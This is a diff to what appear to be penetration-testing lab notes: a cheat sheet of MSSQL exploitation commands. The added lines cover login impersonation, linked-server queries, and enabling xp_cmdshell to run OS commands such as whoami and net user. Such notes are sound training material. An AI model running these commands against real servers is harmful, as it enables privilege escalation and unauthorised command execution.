@@ -179,6 +179,32 @@ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py inlanefreight/fi
 ## MSSQL Exploitation Commands
 
 ```bash
+SELECT name FROM sys.databases;
+USE <dbname>;
+SELECT name FROM sys.tables;
+
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
+SELECT * FROM sys.database_role_members;
+SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
+
+EXECUTE AS LOGIN = 'john';
+SELECT SYSTEM_USER;
+
+SELECT IS_SRVROLEMEMBER('sysadmin');
+
+SELECT srvname, isremote FROM sysservers;
+
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
+
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'net user';
+EXEC xp_readerrorlog;
+EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
+```
+
+```bash
 -- Service accounts
 SELECT servicename, service_account FROM sys.dm_server_services;
 
@@ -193,14 +219,6 @@ SELECT name FROM sys.sql_logins;
 SELECT name FROM sys.database_principals;
 SELECT name FROM sys.server_principals;
 
--- Databases
-SELECT name FROM sys.databases;
-USE <dbname>;
-SELECT name FROM sys.tables;
-
--- Roles & permissions
-SELECT * FROM sys.database_role_members;
-SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
 
 -- Trustworthy DBs
 SELECT name, is_trustworthy_on FROM sys.databases;
